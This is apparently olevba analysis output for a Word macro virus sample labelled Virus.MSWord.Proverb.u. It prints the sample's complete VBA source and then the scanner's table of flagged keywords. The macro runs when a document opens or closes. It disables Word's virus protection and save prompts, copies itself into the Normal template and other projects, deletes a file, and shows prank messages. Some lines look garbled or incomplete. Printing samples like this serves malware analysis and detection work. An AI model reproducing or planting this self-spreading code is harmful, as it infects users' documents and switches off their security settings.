olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Proverb.u-f9d675a69a7e148595df37a61197587e6618ad35
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Proverb.u-f9d675a69a7e148595df37a61197587e6618ad35 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
For I = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(I, 1)
Print #1, a
Next I
Close #1

If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
I = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines I, a
I = I + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub



Private Sub Document_Open()
On Error Resume Next
    With Options
        .SaveNormalPrompt = False
        .VirusProtection = False
    End With
Dim I%, j%, k As Long, m As Boolean
Application.OnTime When:=Now + TimeValue("00:" & Format(Int(Rnd * 5) + 1, "00") & ":00"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
For I = 1 To VBE.VBProjects.Count
 For j = 1 To VBE.VBProjects(I).VBComponents.Count
  With VBE.VBProjects(I).VBComponents(j).CodeModule
     If .CountOfLines < 50 Then
     .deletelines 1, .CountOfLines
     Err.Clear
      .AddFromString Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(1, Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines)
      If Err = 0 Then
        m = False
        For k = .CountOfLines To .CountOfLines - 20 Step -1
           If .Find("Sub OnTimer", k, 1, k, 30) Then m = True: Exit For
        Next
        If m Then
            .deletelines k
            .InsertLines k, IIf(VBE.VBProjects(I).Name = "Normal", "Sub OnTimer()", "Private Sub OnTimer1()")
        End If
      Else
      Application.OnTime When:=Now + TimeValue("00:00:10"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
      End If
     End If
  End With
 Next
Next
End Sub
Private Sub ShowMess()
On Error Resume Next
If Left(Application.Version, 1) = "8" Then
  ShVer8
Else
 If MsgBox(GetMess(), vbOKCancel, Choose(Int(Rnd * 9) + 1, "Ñ 1 Àïðåëÿ Âàñ!", "Îïà?-Óãó!", "À âîò è ñåãîäíÿøíèé ïðèêîë", "Word: Ýòî ÿ áóêâàëüíî òîëüêî ÷òî ïðèäóìàë", "õå-õå", "Word: Ýòî ÿ â Ðóññêîì ðàäèî óñëûøàë", "Ðåêëàìíàÿ ñëóæáà Microsoft Word", "Word: Çàäîëáàëè ìåíÿ ýòè ìàêðîâèðóñû", "Âîò Âàì," & Application.UserName, "Ïîñëåäíèé ïðèêîë ñåçîíà", "Word: Îé, ñåé÷àñ îïèñàþñü...")) = 1 Then ShowMess
End If
End Sub
Private Sub ShVer8()
 On Error Resume Next
 Assistant.Visible = True
 Dim bln As Balloon
 Set bln = Assistant.NewBalloon
 With bln
  .Mode = msoModeAutoDown
  .Heading = GetMess()
  .Animation = Int(Rnd * (117))
  .Button = msoButtonSetNextClose
  .Text = Choose(Int(Rnd * 14) + 1, & Application.UserName & Space(100) & Assistant.Name, "Îïà?-Óãó!", "", "", "óìðó îò ñìåõà", "ïðàâäà ñìåøíî", "À âîò è ñåãîäíÿøíèé ïðèêîë", Assistant.Name & ": Ýòî ÿ áóêâàëüíî òîëüêî ÷òî ïðèäóìàë", Assistant.Name & ": Îé, ñåé÷àñ îïèñàþñü...", "õå-õå", Assistant.Name & ": Ýòî ÿ â Ðóññêîì ðàäèî óñëûøàë", "Ðåêëàìíàÿ ñëóæáà Microsoft Word", Assistant.Name & ": Çàäîëáàëè ìåíÿ ýòè ìàêðîâèðóñû", "Âîò Âàì," & Application.UserName, "Ïîñëåäíèé ïðèêîë ñåçîíà")
  If .Show = -6 Then ShowMess
 End With
 Assistant.Animation = 0
End Sub
Private Function GetMess()
On Error Resume Next
GetMess = Mid(Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(Int(Rnd * Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfDeclarationLines) + 1, 1), 2)
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

